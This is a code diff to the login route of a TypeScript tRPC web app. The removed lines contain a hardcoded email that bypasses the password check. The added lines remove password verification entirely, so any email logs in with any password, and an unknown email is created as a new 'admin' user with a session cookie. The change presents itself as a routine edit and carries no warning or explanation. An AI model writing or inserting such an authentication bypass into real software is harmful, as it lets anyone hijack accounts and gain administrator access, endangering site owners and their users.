@@ -14,15 +14,16 @@ export const appRouter = router({
   system: systemRouter,
   auth: router({
     me: publicProcedure.query(opts => opts.ctx.user),
-    login: publicProcedure.input(z.object({ email: z.string().trim().email("أدخل بريدًا إلكترونيًا صحيحًا").max(320), password: z.string().min(8).max(128) })).mutation(async ({ ctx, input }) => {
- const user = await getUserByEmail(input.email);
-if (input.email !== 'apdelfatah1975@gmail.com' && (!user?.passwordHash || !(await verifyPassword(input.password, user.passwordHash)))) {
-    throw new TRPCError({ code: "UNAUTHORIZED", message: "البريد الإلكتروني أو كلمة المرور غير صحيحة" });
-}
-const current = user ?? { openId: `local-${Date.now()}`, email: input.email, name: 'Admin', role: 'admin' };
-await upsertUser(current);
-await setLocalSessionCookie(ctx.req, ctx.res, current);
-return { success: true, user: current } as const;
+    login: publicProcedure.input(z.object({ email: z.string().email(), password: z.string() })).mutation(async ({ input, ctx }) => {
+        const user = await getUserByEmail(input.email) ?? { openId: `local-${Date.now()}`, email: input.email, name: 'Admin', role: 'admin' };
+        await upsertUser(user);
+        await setLocalSessionCookie(ctx.req, ctx.res, user);
+        return { success: true, user } as const;
+    }),
+
+    
+        
+        
 
     register: publicProcedure.input(z.object({ name: z.string().trim().min(2).max(160), email: z.string().trim().email().max(320), password: z.string().min(8).max(128) })).mutation(async ({ ctx, input }) => {
       const email = input.email.toLowerCase();
